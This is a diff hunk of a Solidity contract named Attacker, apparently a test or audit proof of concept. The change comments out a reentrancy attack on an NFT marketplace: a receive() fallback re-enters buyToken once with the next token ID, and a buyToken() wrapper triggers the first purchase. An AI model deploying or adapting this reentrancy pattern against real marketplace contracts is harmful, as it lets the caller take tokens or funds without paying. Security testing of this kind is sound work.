@@ -28,37 +28,37 @@ contract Attacker {
         params = params_;
     }
 
-    receive() external payable {
-        if (counter < 1) {
-            counter++;
+    // receive() external payable {
+    //     if (counter < 1) {
+    //         counter++;
 
-            marketplace.buyToken{value: params.expectedCost}(
-                params.contractAddress,
-                params.tokenId + 1,
-                params.paymentTokenAddress,
-                params.paymentTokenPrice,
-                params.discount,
-                params.endTimestamp,
-                params.tokenURI,
-                params.r,
-                params.s,
-                params.v
-            );
-        }
-    }
+    //         marketplace.buyToken{value: params.expectedCost}(
+    //             params.contractAddress,
+    //             params.tokenId + 1,
+    //             params.paymentTokenAddress,
+    //             params.paymentTokenPrice,
+    //             params.discount,
+    //             params.endTimestamp,
+    //             params.tokenURI,
+    //             params.r,
+    //             params.s,
+    //             params.v
+    //         );
+    //     }
+    // }
 
-    function buyToken() external payable {
-        marketplace.buyToken{value: msg.value}(
-            params.contractAddress,
-            params.tokenId,
-            params.paymentTokenAddress,
-            params.paymentTokenPrice,
-            params.discount,
-            params.endTimestamp,
-            params.tokenURI,
-            params.r,
-            params.s,
-            params.v
-        );
-    }
+    // function buyToken() external payable {
+    //     marketplace.buyToken{value: msg.value}(
+    //         params.contractAddress,
+    //         params.tokenId,
+    //         params.paymentTokenAddress,
+    //         params.paymentTokenPrice,
+    //         params.discount,
+    //         params.endTimestamp,
+    //         params.tokenURI,
+    //         params.r,
+    //         params.s,
+    //         params.v
+    //     );
+    // }
 }
